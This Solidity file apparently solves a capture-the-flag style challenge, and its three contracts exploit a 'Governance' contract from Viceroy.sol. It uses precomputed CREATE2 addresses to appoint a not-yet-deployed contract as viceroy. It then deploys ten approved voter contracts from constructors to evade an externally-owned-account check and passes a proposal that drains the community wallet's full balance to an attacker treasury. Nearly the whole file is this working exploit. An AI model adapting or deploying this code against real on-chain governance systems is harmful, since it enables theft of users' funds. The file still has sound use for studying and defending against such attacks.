// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import {Governance} from "./Viceroy.sol";

contract GovernanceViceroyAssigner {
    address attackTreasury;

    constructor(address _attackTreasury) {
        attackTreasury = _attackTreasury;

    }

    function attack(address _governance) external {
        Governance governance = Governance(_governance);

        // get bytecode
        bytes memory bytecode = type(ViceroyAttacker).creationCode;
        bytecode = abi.encodePacked(
            bytecode,
            abi.encode(_governance, attackTreasury, address(governance.communityWallet()))
        );
        // hash with fixed salt 
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(this),
                uint(123),
                keccak256(bytecode)
            )
        );
        address viceroyFutureAddress = address(uint160(uint(hash)));

        Governance(_governance).appointViceroy(viceroyFutureAddress, 1);

        new ViceroyAttacker{salt: bytes32(uint(123))}(
            _governance,
            attackTreasury,
            address(governance.communityWallet())
        );
    }
}

contract ViceroyAttacker {
    constructor(
        address _governance,
        address _attackTreasury,
        address _communityWallet
    ) {
        Governance governance = Governance(_governance);
        
        // transffer funds to our treasury
        bytes memory data = abi.encodeWithSignature(
            "exec(address,bytes,uint256)",
            _attackTreasury,
            "0x",
            _communityWallet.balance
        );

        // this contract is registered as viceroy
        governance.createProposal(_attackTreasury, data);
        uint256 proposalId = uint256(keccak256(data));
        
        // 10 votes
        for (uint saltCounter = 0; saltCounter < 10; saltCounter++) {
            // only EOA are allowed, so we need to approveVoter before contract is created
            bytes memory bytecode = type(Voter).creationCode;
            bytecode = abi.encodePacked(
                bytecode,
                abi.encode(_governance, proposalId, address(this))
            );

            // 0xFF, a constant that prevents collisions with CREATE
            // the creator address
            // salt (an arbitrary 32 bytes long value provided by the sender)
            // keccak256 of the to-be-deployed contract’s bytecode
            bytes32 hash = keccak256(
                abi.encodePacked(
                    bytes1(0xff),
                    address(this),
                    saltCounter,
                    keccak256(bytecode)
                )
            );

            // address is 20 bytes of keccak256
            address deployedAddr = address(uint160(uint(hash)));
            
            governance.approveVoter(deployedAddr);

            // once we have voter approved we can execut voe (in Voter constructor)
            new Voter{salt: bytes32(saltCounter)}(
                _governance,
                proposalId,
                address(this)
            );
            governance.disapproveVoter(deployedAddr);    
        }

        // we have 10 votes and we can execute our prosoal which was to send all funds to our treasury
        governance.executeProposal(proposalId);
    }
}

contract Voter {
    constructor(address _governance, uint256 _proposalId, address _viceroy) {
        Governance(_governance).voteOnProposal(_proposalId, true, _viceroy);
    }
}
